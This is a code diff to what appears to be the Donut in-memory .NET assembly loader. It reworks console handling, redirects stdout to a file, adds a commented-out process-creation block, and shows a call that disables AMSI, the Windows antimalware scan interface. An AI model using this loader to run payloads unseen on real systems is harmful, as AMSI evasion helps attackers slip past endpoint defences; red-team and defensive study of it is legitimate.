@@ -37,12 +37,16 @@
 #endif
 
 BOOL WINAPI HandlerRoutine(DWORD dwCtrlType);
-
+LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
+  
 DWORD ThreadProc(LPVOID lpParameter) {
-    ULONG           i, ofs;
-    ULONG64         sig;
-    PDONUT_INSTANCE inst = (PDONUT_INSTANCE)lpParameter;
-    DONUT_ASSEMBLY  assembly;
+    ULONG               i, ofs;
+    ULONG64             sig;
+    PDONUT_INSTANCE     inst = (PDONUT_INSTANCE)lpParameter;
+    DONUT_ASSEMBLY      assembly;
+    HANDLE              hstdout;
+    STARTUPINFO         si;
+    PROCESS_INFORMATION pi;
     
     Memset((PBYTE)&assembly, 0, sizeof(assembly));
     
@@ -95,20 +99,57 @@ DWORD ThreadProc(LPVOID lpParameter) {
       if(!DownloadModule(inst)) return -1;
     }
     
-    // allocate console for modules that require access
-    // to a console..
-    #if !defined(DEBUG)
+    DPRINT("Checking for console");
+    Memset((PBYTE)&pi, 0, sizeof(pi));
+    // try obtain handle for stdout
+    hstdout = inst->api.GetStdHandle(STD_OUTPUT_HANDLE);
+    // if no console exists, we assume we're running inside a GUI
+    if(hstdout == INVALID_HANDLE_VALUE ||
+       hstdout == NULL) 
+    {
       inst->api.AllocConsole();
-    #endif
-    
-   // inst->api.SetConsoleCtrlHandler(HandlerRoutine, TRUE);
-    
-    //inst->api.AttachConsole(ATTACH_PARENT_PROCESS);
+      
+      // create file for output
+      hstdout = inst->api.CreateFileA(
+        inst->output,
+        GENERIC_WRITE,
+        0,
+        NULL,
+        CREATE_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL);
+        
+      // set handle for redirection
+      inst->api.SetStdHandle(STD_OUTPUT_HANDLE, hstdout);
 
+      /**
+      DPRINT("Creating new process");
+      Memset((PBYTE)&si, 0, sizeof(si));
+      
+      inst->api.CreateProcessA(
+        NULL,                 // lpApplicationName
+        inst->cmd,            // lpCommandLine
+        NULL,                 // lpProcessAttributes
+        NULL,                 // lpThreadAttributes
+        TRUE,                 // bInheritHandles
+        CREATE_NEW_CONSOLE,   // dwCreationFlags
+        NULL,                 // lpEnvironment
+        NULL,                 // lpCurrentDirectory
+        &si,                  // lpStartupInfo
+        &pi);                 // lpProcessInformation
+      
+       //
+       inst->api.AttachConsole(pi.dwProcessId);*/
+    }
+    
     if(LoadAssembly(inst, &assembly)) {
       RunAssembly(inst, &assembly);
     }
     
+    // if console process was forked, wait for it to terminate
+   /* if(pi.hProcess != NULL) {
+      inst->api.WaitForSingleObject(pi.hProcess, INFINITE);
+    }*/
     FreeAssembly(inst, &assembly);
     
     // clear instance from memory
@@ -116,6 +157,16 @@ DWORD ThreadProc(LPVOID lpParameter) {
     
     return 0;
 }
+
+LRESULT CALLBACK GUIWndProc(
+  HWND   hwnd, 
+  UINT   uMsg, 
+  WPARAM wParam, 
+  LPARAM lParam) 
+{
+    return 0;
+}
+
 BOOL WINAPI HandlerRoutine(DWORD dwCtrlType) {
     switch(dwCtrlType) {
       case CTRL_C_EVENT :
@@ -231,7 +282,6 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
           
         if(SUCCEEDED(hr)) {
           // Try to disable AMSI
-          DPRINT("Detected AMSI");
           amsi = DisableAMSI(inst);
           DPRINT("DisableAMSI %s", amsi ? "OK" : "FAILED");
             
